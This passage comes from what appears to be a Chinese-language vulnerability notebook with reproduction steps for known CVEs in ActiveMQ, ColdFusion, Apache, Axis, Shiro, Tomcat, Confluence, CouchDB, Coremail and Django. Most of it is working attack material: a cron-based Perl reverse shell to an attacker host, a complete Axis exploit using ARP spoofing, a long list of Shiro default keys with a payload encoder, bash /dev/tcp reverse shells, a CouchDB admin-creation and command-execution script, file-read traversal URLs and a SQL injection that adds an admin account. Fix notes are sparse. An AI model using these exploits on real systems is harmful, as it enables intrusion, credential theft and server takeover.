<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/43.png" alt></li>
<li>可写入：</li>
<li><ul>
<li>webshell（简单方便，但需要登录）</li>
</ul>
</li>
<li><ul>
<li>cron文件（方便，可直接反弹shell，但需要root权限）</li>
</ul>
</li>
<li><ul>
<li>ssh key文件（方便，可直接登录，但需要root权限）</li>
</ul>
</li>
<li><ul>
<li>jar文件（麻烦且需要jar后门）</li>
</ul>
</li>
<li><ul>
<li>jetty.xml文件（可靠，需要绝对路径）</li>
</ul>
</li>
<li>等等</li>
<li></li>
<li><strong>例子1：</strong></li>
<li>默认账号密码：admin/admin</li>
<li>访问 <a href="http://your-ip:8161/admin/test/systemProperties.jsp" target="_blank" rel="noopener">http://your-ip:8161/admin/test/systemProperties.jsp</a> #查看ActiveMQ的绝对路径</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/45.png" alt></li>
<li>写入文件（回显204，说明成功）：</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/44.png" alt><pre><code>PUT /fileserver/test.txt HTTP/1.1
Host: IP:8161
...
webshell...</code></pre></li>
<li>移动文件（回显204，说明成功）：<pre><code>MOVE /fileserver/test.txt HTTP/1.1
Destination: file:///opt/activemq/webapps/api/test.jsp
Host: IP:8161
...</code></pre></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/46.png" alt></li>
<li>访问webshell（需要登录）</li>
</ol>
<pre><code>#写入计划任务
PUT /fileserver/cron.txt HTTP/1.1
Host: IP:8161
POST
*/1 * * * * root /usr/bin/perl -e &#39;use Socket;$i=&quot;attacker_IP&quot;;$p=attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre><ol>
<li>移动到计划任务中<pre><code>MOVE /fileserver/cron.txt HTTP/1.1
Destination: file:///etc/cron.d/root
Host: IP:8161</code></pre></li>
<li>Linux：<code>nc -lvp attacker_port</code></li>
<li>Windows Nmap: <code>ncat -lvp attacker_port</code></li>
</ol>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ol>
<li>5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（可以在conf/jetty.xml中开启之）</li>
<li>在5.14.0版本以后，彻底删除了fileserver应用。</li>
</ol>
<p><a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md</a></p>
<hr>
<h2 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a><span id="CVE-2010-2861">Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</span></h2><ol>
<li>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</li>
<li>Adobe ColdFusion 8、9</li>
<li><strong>复现：</strong></li>
<li>URL:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</li>
<li>读后台管理员密码：URL:/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</li>
</ol>
<hr>
<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a><span id="Apache解析漏洞">Apache解析漏洞</span></h2><ol>
<li>版本：Apache 2.4.0到2.4.29</li>
<li>使用burpsuite的hex功能，在文件后缀名后添加一个0a，访问test.php%0a</li>
</ol>
<hr>
<h2 id="Apache-Axis-1-4远程代码执行（CVE-2019-0227）"><a href="#Apache-Axis-1-4远程代码执行（CVE-2019-0227）" class="headerlink" title="Apache Axis 1.4远程代码执行（CVE-2019-0227）"></a><span id="CVE-2019-0227">Apache Axis 1.4远程代码执行（CVE-2019-0227）</span></h2><ol>
<li>版本：Apache Axis版本= 1.4</li>
</ol>
<pre><code>import SimpleHTTPServer
import SocketServer
import subprocess
from time import sleep
import thread
import requests
from urllib import quote_plus
import sys

#Usage: python CVE-2019-0227.py shell.jsp

#You need to change these variable to match your configuration
myip = &quot;192.168.0.117&quot; #IP of your machine
target = &quot;192.168.0.102&quot; #IP of target
gateway = &quot;192.168.0.1&quot; #default gateway
targetport = &quot;8080&quot; #Port of target running axis (probably 8080)
pathtoaxis = &quot;http://192.168.0.102:8080/axis&quot; #This can be custom depending on the Axis install, but this is default
spoofinterface = &quot;eth0&quot; #Interface for arpspoofing
jspwritepath = &quot;webapps\\axis\\exploit.jsp&quot; #relative path on the target to write the JSP payload This is the default on a Tomcat install

#msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp
payloadfile = open(sys.argv[1],&#39;r&#39;).read() #Some file containing a JSP payload

#craft URL to deploy a service as described here https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
deployurl = &#39;http://localhost:&#39;+targetport+&#39;/axis/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22exploitservice%22+provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler+type%3D%22RandomLog%22%2F%3E%3C%2FrequestFlow%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22java.util.Random%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3Chandler+name%3D%22RandomLog%22+type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22+%3E%3Cparameter+name%3D%22LogHandler.fileName%22+value%3D%22&#39;+quote_plus(jspwritepath)+&#39;%22+%2F%3E%3Cparameter+name%3D%22LogHandler.writeToConsole%22+value%3D%22false%22+%2F%3E%3C%2Fhandler%3E%3C%2Fns1%3Adeployment&#39;

#craft URL to undeploy a service as described here https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
undeployurl = &#39;http://localhost:&#39;+targetport+&#39;/axis/services/AdminService?method=%21--%3E%3Cns1%3Aundeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22exploitservice%22%2F%3E%3C%2Fns1%3Aundeployment&#39;


def CreateJsp(pathtoaxis,jsppayload):
    url = pathtoaxis+&quot;/services/exploitservice&quot;
    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;SOAPAction&quot;: &quot;something&quot;, &quot;Content-Type&quot;: &quot;text/xml;charset=UTF-8&quot;}
    data=&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;\r\n        &lt;soapenv:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot;\r\n        xmlns:api=\&quot;http://127.0.0.1/Integrics/Enswitch/API\&quot;\r\n        xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot;\r\n        xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;\r\n        &lt;soapenv:Body&gt;\r\n        &lt;api:main\r\n        soapenv:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;\r\n            &lt;api:in0&gt;&lt;![CDATA[\r\n&quot;+jsppayload+&quot;\r\n]]&gt;\r\n            &lt;/api:in0&gt;\r\n        &lt;/api:main&gt;\r\n  &lt;/soapenv:Body&gt;\r\n&lt;/soapenv:Envelope&gt;&quot;
    requests.post(url, headers=headers, data=data)

def TriggerSSRF(pathtoaxis):
    url = pathtoaxis+&quot;/StockQuoteService.jws&quot;
    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;SOAPAction&quot;: &quot;&quot;, &quot;Content-Type&quot;: &quot;text/xml;charset=UTF-8&quot;}
    data=&quot;&lt;soapenv:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot; xmlns:def=\&quot;http://DefaultNamespace\&quot;&gt;\r\n   &lt;soapenv:Header/&gt;\r\n   &lt;soapenv:Body&gt;\r\n      &lt;def:getQuote soapenv:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;\r\n         &lt;symbol xsi:type=\&quot;xsd:string\&quot;&gt;dwas&lt;/symbol&gt;\r\n      &lt;/def:getQuote&gt;\r\n   &lt;/soapenv:Body&gt;\r\n&lt;/soapenv:Envelope&gt;&quot;
    requests.post(url, headers=headers, data=data)


def StartMitm(interface,target,gateway):
    subprocess.Popen(&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;,shell=True)#Enable forwarding
    subprocess.Popen(&quot;arpspoof -i {} -t {} {}&quot;.format(interface,target,gateway),shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)#spoof target -&gt; gateway
    subprocess.Popen(&quot;iptables -t nat -A PREROUTING -p tcp --dport 80 -j NETMAP --to {}&quot;.format(myip),shell=True)#use iptable to redirect back to our web server


def KillMitm(target,myip):
    subprocess.Popen(&quot;pkill arpspoof&quot;,shell=True)
    subprocess.Popen(&quot;echo 0 &gt; /proc/sys/net/ipv4/ip_forward&quot;,shell=True)
    subprocess.Popen(&quot;iptables -t nat -D PREROUTING -p tcp --dport 80 -j NETMAP --to {}&quot;.format(myip),shell=True)


def SSRFRedirect(new_path):
    class myHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header(&#39;Location&#39;, new_path)
           self.end_headers()
    PORT = 80
    SocketServer.TCPServer.allow_reuse_address = True
    handler = SocketServer.TCPServer((&quot;&quot;, PORT), myHandler)
    print &quot;[+] Waiting to redirect&quot;
    handler.handle_request()
    print &quot;[+] Payload URL sent&quot;


def ExecuteJsp(pathtoaxis):
    subprocess.Popen(&quot;curl &quot;+pathtoaxis+&quot;/exploit.jsp&quot;,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

print &quot;[+] Starting MITM&quot;
StartMitm(spoofinterface,target,gateway)
sleep(2)

print &quot;[+] Starting web server for SSRF&quot;
thread.start_new_thread(SSRFRedirect,(deployurl,))

print &quot;[+] Using StockQuoteService.jws to trigger SSRF&quot;
TriggerSSRF(pathtoaxis)
print &quot;[+] Waiting 3 seconds for incoming request&quot;
sleep(3)

print &quot;[+] Writing JSP payload&quot;
CreateJsp(pathtoaxis,payloadfile)

print &quot;[+] Cleaning up exploit service&quot;
thread.start_new_thread(SSRFRedirect,(undeployurl,))
TriggerSSRF(pathtoaxis)

print &quot;[+] Cleaning up man in the middle&quot;
KillMitm(target,myip)

print &quot;[+] Waiting 2 seconds for JSP write&quot;
sleep(2)
ExecuteJsp(pathtoaxis)

print &quot;[+] Default URL to the jsp payload:&quot;
print pathtoaxis+&quot;/exploit.jsp&quot;</code></pre><hr>
<h2 id="Apache-Shiro-1-2-4-反序列化漏洞（CVE-2016-4437）"><a href="#Apache-Shiro-1-2-4-反序列化漏洞（CVE-2016-4437）" class="headerlink" title="Apache Shiro 1.2.4 反序列化漏洞（CVE-2016-4437）"></a><span id="CVE-2016-4437">Apache Shiro 1.2.4 反序列化漏洞（CVE-2016-4437）</span></h2><ol>
<li>版本：Apache Shiro &lt;=1.2.4</li>
<li>keys:</li>
</ol>
<pre><code>kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
0AvVhmFLUs0KTA3Kprsdag==
1AvVhdsgUs0FSA3SDFAdag==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0FSA3SDFAdag==
3AvVhmFLUs0KTA3Kprsdag==
3JvYhmBLUs0ETA5Kprsdag==
r0e3c16IdVkouZgk1TKVMg==
5aaC5qKm5oqA5pyvAAAAAA==
5AvVhmFLUs0KTA3Kprsdag==
6AvVhmFLUs0KTA3Kprsdag==
6NfXkC7YVCV5DASIrEm1Rg==
6ZmI6I2j5Y+R5aSn5ZOlAA==
cmVtZW1iZXJNZQAAAAAAAA==
7AvVhmFLUs0KTA3Kprsdag==
8AvVhmFLUs0KTA3Kprsdag==
8BvVhmFLUs0KTA3Kprsdag==
9AvVhmFLUs0KTA3Kprsdag==
OUHYQzxQ/W9e/UjiAGu6rg==
a3dvbmcAAAAAAAAAAAAAAA==
aU1pcmFjbGVpTWlyYWNsZQ==
bWljcm9zAAAAAAAAAAAAAA==
bWluZS1hc3NldC1rZXk6QQ==
bXRvbnMAAAAAAAAAAAAAAA==
ZUdsaGJuSmxibVI2ZHc9PQ==
wGiHplamyXlVB11UXWol8g==
U3ByaW5nQmxhZGUAAAAAAA==
MTIzNDU2Nzg5MGFiY2RlZg==
L7RioUULEFhRyxM7a2R/Yg==
a2VlcE9uR29pbmdBbmRGaQ==
WcfHGU25gNnTxTlmJMeSpw==
OY//C4rhfwNxCQAQCrQQ1Q==
5J7bIJIV0LQSN3c9LPitBQ==
f/SY5TIve5WWzT4aQlABJA==
bya2HkYo57u6fWh5theAWw==
WuB+y2gcHRnY2Lg9+Aqmqg==
kPv59vyqzj00x11LXJZTjJ2UHW48jzHN
3qDVdLawoIr1xFd6ietnwg==
ZWvohmPdUsAWT3=KpPqda
YI1+nBV//m7ELrIyDHm6DQ==
6Zm+6I2j5Y+R5aS+5ZOlAA==
2A2V+RFLUs+eTA3Kpr+dag==
6ZmI6I2j3Y+R1aSn5BOlAA==
SkZpbmFsQmxhZGUAAAAAAA==
2cVtiE83c4lIrELJwKGJUw==
fsHspZw/92PrS3XrPW+vxw==
XTx6CKLo/SdSgub+OPHSrw==
sHdIjUN6tzhl8xZMG3ULCQ==
O4pdf+7e+mZe8NyxMTPJmQ==
HWrBltGvEZc14h9VpMvZWw==
rPNqM6uKFCyaL10AK51UkQ==
Y1JxNSPXVwMkyvES/kJGeQ==
lT2UvDUmQwewm6mMoiw4Ig==
MPdCMZ9urzEA50JDlDYYDg==
xVmmoltfpb8tTceuT5R7Bw==
c+3hFGPjbgzGdrC+MHgoRQ==
ClLk69oNcA3m+s0jIMIkpg==
Bf7MfkNR0axGGptozrebag==
1tC/xrDYs8ey+sa3emtiYw==
ZmFsYWRvLnh5ei5zaGlybw==
cGhyYWNrY3RmREUhfiMkZA==
IduElDUpDDXE677ZkhhKnQ==
yeAAo1E8BOeAYfBlm4NG9Q==
cGljYXMAAAAAAAAAAAAAAA==
2itfW92XazYRi5ltW0M2yA==
XgGkgqGqYrix9lI6vxcrRw==
ertVhmFLUs0KTA3Kprsdag==
5AvVhmFLUS0ATA4Kprsdag==
s0KTA3mFLUprK4AvVhsdag==
hBlzKg78ajaZuTE0VLzDDg==
9FvVhtFLUs0KnA3Kprsdyg==
d2ViUmVtZW1iZXJNZUtleQ==
yNeUgSzL/CfiWw1GALg6Ag==
NGk/3cQ6F5/UNPRh8LpMIg==
4BvVhmFLUs0KTA3Kprsdag==
MzVeSkYyWTI2OFVLZjRzZg==
CrownKey==a12d/dakdad
empodDEyMwAAAAAAAAAAAA==
A7UzJgh1+EWj5oBFi+mSgw==
YTM0NZomIzI2OTsmIzM0NTueYQ==
c2hpcm9fYmF0aXMzMgAAAA==
i45FVt72K2kLgvFrJtoZRw==
U3BAbW5nQmxhZGUAAAAAAA==
ZnJlc2h6Y24xMjM0NTY3OA==
Jt3C93kMR9D5e8QzwfsiMw==
MTIzNDU2NzgxMjM0NTY3OA==
vXP33AonIp9bFwGl7aT7rA==
V2hhdCBUaGUgSGVsbAAAAA==
Z3h6eWd4enklMjElMjElMjE=
Q01TX0JGTFlLRVlfMjAxOQ==
ZAvph3dsQs0FSL3SDFAdag==
Is9zJ3pzNh2cgTHB4ua3+Q==
NsZXjXVklWPZwOfkvk6kUA==
GAevYnznvgNCURavBhCr1w==
66v1O8keKNV3TTcGPK1wzg==
SDKOLKn2J1j/2BHjeZwAoQ==</code></pre><ol>
<li>bash转码地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></li>
<li><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</code></li>
</ol>
<p>exploit.py</p>
<pre><code>import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == &#39;__main__&#39;:
    payload = encode_rememberme(sys.argv[1])    
print &quot;rememberMe={0}&quot;.format(payload.decode())</code></pre><h3 id="shiro测试二"><a href="#shiro测试二" class="headerlink" title="shiro测试二"></a>shiro测试二</h3><ol>
<li><code>python3 shiro.py URL &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}&quot;</code></li>
</ol>
<hr>
<h2 id="APACHE-TOMCAT-文件包含漏洞（CVE-2020-1938）"><a href="#APACHE-TOMCAT-文件包含漏洞（CVE-2020-1938）" class="headerlink" title="APACHE TOMCAT 文件包含漏洞（CVE-2020-1938）"></a><span id="CVE-2020-1938">APACHE TOMCAT 文件包含漏洞（CVE-2020-1938）</span></h2><pre><code>Apache Tomcat 6
Apache Tomcat 7 &lt; 7.0.100
Apache Tomcat 8 &lt; 8.5.51
Apache Tomcat 9 &lt; 9.0.31</code></pre><p><strong>复现环境</strong></p>
<ol>
<li><a href="https://vulhub.org/#/environments/tomcat/CVE-2020-1938/" target="_blank" rel="noopener">https://vulhub.org/#/environments/tomcat/CVE-2020-1938/</a></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/40.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/41.png" alt></li>
<li><code>python W:\CVE-2020-1938\exp.py -p 8009 -f /WEB-INF/web.xml IP</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/42.png" alt></li>
<li><code>python W:\CVE-2020-1938\exp.py -p 8009 -f /index.jsp IP</code></li>
</ol>
<p><strong>修复：</strong></p>
<ul>
<li>临时禁用AJP协议端口，在conf/server.xm l配置文件中注释掉&lt;Connector port=”8009” protocol=”AJP/1.3”redirectPort=”8443” /&gt;</li>
<li>配置ajp配置中的secretRequired跟secret属性来限制认证</li>
</ul>
<hr>
<h2 id="Confluence"><a href="#Confluence" class="headerlink" title="Confluence"></a><span id="Confluence">Confluence</span></h2><p>（CVE-2019-3394）Confluence 文件读取漏洞</p>
<pre><code>6.1.0 &lt;= version &lt; 6.6.16
6.7.0 &lt;= version &lt; 6.13.7
6.14.0 &lt;= version &lt; 6.15.8</code></pre><p>（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞</p>
<pre><code>Confluence 1.*.*、2.*.*、3.*.*、4.*.*、5.*.*
Confluence 6.0.*、6.1.*、6.2.*、6.3.*、6.4.*、6.5.*
Confluence 6.6.* &lt; 6.6.12
Confluence6.7.*、6.8.*、6.9.*、6.10.*、6.11.*
Confluence 6.12.* &lt; 6.12.3
Confluence 6.13.* &lt; 6.13.3
Confluence 6.14.* &lt; 6.14.2</code></pre><p>（CVE-2019-3398）Confluence 路径穿越漏洞</p>
<pre><code>2.0.0 &lt;= version &lt; 6.6.13
6.7.0 &lt;= version &lt; 6.12.4
6.13.0 &lt;= version &lt; 6.13.4
6.14.0 &lt;= version &lt; 6.14.3
6.15.0 &lt;= version &lt; 6.15.2</code></pre><hr>
<h2 id="CouchDB-CVE-2017-12635垂直权限绕过-CVE-2017-12636任意命令执行"><a href="#CouchDB-CVE-2017-12635垂直权限绕过-CVE-2017-12636任意命令执行" class="headerlink" title="CouchDB CVE-2017-12635垂直权限绕过 CVE-2017-12636任意命令执行"></a><span id="CVE-2017-12636">CouchDB CVE-2017-12635垂直权限绕过 CVE-2017-12636任意命令执行</span></h2><ol>
<li>CouchDB是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库，2017年时被爆出了2个CVE。</li>
<li>端口：5984</li>
</ol>
<h3 id="CVE-2017-12635垂直权限绕过"><a href="#CVE-2017-12635垂直权限绕过" class="headerlink" title="CVE-2017-12635垂直权限绕过"></a>CVE-2017-12635垂直权限绕过</h3><ol>
<li>发送如下数据包，即可成功创建管理员用户，账号密码都是vulhub，<a href="http://IP:5984/_utils/" target="_blank" rel="noopener">http://IP:5984/_utils/</a></li>
</ol>
<pre><code>PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: IP:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108

{
  &quot;type&quot;: &quot;user&quot;,
  &quot;name&quot;: &quot;vulhub&quot;,
  &quot;roles&quot;: [&quot;_admin&quot;],
  &quot;roles&quot;: [],
  &quot;password&quot;: &quot;vulhub&quot;
}</code></pre><h3 id="CVE-2017-12636任意命令执行"><a href="#CVE-2017-12636任意命令执行" class="headerlink" title="CVE-2017-12636任意命令执行"></a>CVE-2017-12636任意命令执行</h3><ol>
<li>Couchdb 2.x和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。使用以下exp，修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本（1或2），可成功反弹shell。</li>
</ol>
<pre><code>#!/usr/bin/env python3
import requests
import json
import base64
from requests.auth import HTTPBasicAuth

target = &#39;http://your-ip:5984&#39;
command = rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;&quot;&quot;
version = 1

session = requests.session()
session.headers = {
    &#39;Content-Type&#39;: &#39;application/json&#39;
}
# session.proxies = {
#     &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;
# }
session.put(target + &#39;/_users/org.couchdb.user:wooyun&#39;, data=&#39;&#39;&#39;{
  &quot;type&quot;: &quot;user&quot;,
  &quot;name&quot;: &quot;wooyun&quot;,
  &quot;roles&quot;: [&quot;_admin&quot;],
  &quot;roles&quot;: [],
  &quot;password&quot;: &quot;wooyun&quot;
}&#39;&#39;&#39;)

session.auth = HTTPBasicAuth(&#39;wooyun&#39;, &#39;wooyun&#39;)

command = &quot;bash -c &#39;{echo,%s}|{base64,-d}|{bash,-i}&#39;&quot; % base64.b64encode(command).decode()
if version == 1:
    session.put(target + (&#39;/_config/query_servers/cmd&#39;), data=json.dumps(command))
else:
    host = session.get(target + &#39;/_membership&#39;).json()[&#39;all_nodes&#39;][0]
    session.put(target + &#39;/_node/{}/_config/query_servers/cmd&#39;.format(host), data=json.dumps(command))

session.put(target + &#39;/wooyun&#39;)
session.put(target + &#39;/wooyun/test&#39;, data=&#39;{&quot;_id&quot;: &quot;wooyuntest&quot;}&#39;)

if version == 1:
    session.post(target + &#39;/wooyun/_temp_view?limit=10&#39;, data=&#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39;)
else:
    session.put(target + &#39;/wooyun/_design/test&#39;, data=&#39;{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}&#39;)</code></pre><hr>
<h2 id="Coremail配置文件信息泄漏"><a href="#Coremail配置文件信息泄漏" class="headerlink" title="Coremail配置文件信息泄漏"></a><span id="Coremail">Coremail配置文件信息泄漏</span></h2><ol>
<li>Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞</li>
<li>POC：<code>http://mail.xxxxx.com/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/</code></li>
</ol>
<h2 id="Couchcms-2-0-存在路径泄露漏洞（CVE-2018-7662）"><a href="#Couchcms-2-0-存在路径泄露漏洞（CVE-2018-7662）" class="headerlink" title="Couchcms 2.0 存在路径泄露漏洞（CVE-2018-7662）"></a><span id="CVE-2018-7662">Couchcms 2.0 存在路径泄露漏洞（CVE-2018-7662）</span></h2><ol>
<li>版本：Couch through 2.0</li>
<li>POC：<pre><code>URL/includes/mysql2i/mysql2i.func.php
URL/addons/phpmailer/phpmailer.php</code></pre></li>
</ol>
<hr>
<h2 id="Django-JSONField-sql注入漏洞（CVE-2019-14234）"><a href="#Django-JSONField-sql注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField sql注入漏洞（CVE-2019-14234）"></a><span id="CVE-2019-14234">Django JSONField sql注入漏洞（CVE-2019-14234）</span></h2><ol>
<li>版本：1.11.x before 1.11.23、2.1.x before 2.1.11、2.2.x before 2.2.4</li>
<li>后台：<code>http://ip:8000/admin/vuln/collection/</code></li>
<li>构造URL进行查询：<code>http://ip:8000/admin/vuln/collection/?detail__a%27b=123</code></li>
<li>payload：<code>http://ip:8000/admin/vuln/collection/?detail__title&#39;)%3d&#39;1&#39; or 1%3d1 %3bcopy cmd_exec FROM PROGRAM &#39;net user admin admin /add&#39;--%20</code></li>
</ol>
<hr>
<h2 id="Django-sql注入漏洞（CVE-2020-7471）"><a href="#Django-sql注入漏洞（CVE-2020-7471）" class="headerlink" title="Django sql注入漏洞（CVE-2020-7471）"></a><span id="CVE-2020-7471">Django sql注入漏洞（CVE-2020-7471）</span></h2><ol>
<li>版本：<pre><code>Django 1.11.x &lt; 1.11.28
Django 2.2.x &lt; 2.2.10
Django 3.0.x &lt; 3.0.3
Django 主开发分支</code></pre></li>
</ol>
<p>POC:</p>
<pre><code># encoding:utf-8
import os
import django
os.environ.setdefault(&quot;DJANGO_SETTINGS_MODULE&quot;, &quot;sqlvul_project.settings&quot;)

# Django 版本大于等于1.7的时候，需要加上下面两句
if django.VERSION &gt;= (1, 7):#自动判断版本
    django.setup()

from vul_app.models import Info
from django.contrib.postgres.aggregates import StringAgg
from django.db.models import Count

&quot;&quot;&quot;
postgres 预先执行的SQL
CREATE DATABASE test;
\c test;
\d 列出当前数据库的所有表格
&quot;&quot;&quot;

def initdb():
    data = [(&#39;li&#39;,&#39;male&#39;),(&#39;zhao&#39;,&#39;male&#39;),(&#39;zhang&#39;,&#39;female&#39;)]
    for name,gender in data:
        Info.objects.get_or_create(name=name,gender=gender)

def query():
    # FUZZ delimiter
    error_c = []
    other_error_c = []
    for c in &quot;!@#$%^&amp;*()_+=-|\\\&quot;&#39;:;?/&gt;.&lt;,{}[]&quot;:
        results = Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname=StringAgg(&#39;name&#39;,delimiter=c))
        try:
            for e in results:
                pass
        except IndexError:
            error_c.append(c)
        except:
            other_error_c.append(c)
    print(error_c)
    print(other_error_c)

def query_with_evil():
    &#39;&#39;&#39;
    注入点证明
    分别设置delimiter为 单引号 二个单引号 二个双引号
    尝试注释后面的内容 &#39;)--
    :return:
    &#39;&#39;&#39;
    print(&quot;[+]正常的输出：&quot;)
    payload = &#39;-&#39;
    results = Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname=StringAgg(&#39;name&#39;, delimiter=payload))
    for e in results:
        print(e)
    print(&quot;[+]注入后的的输出：&quot;)
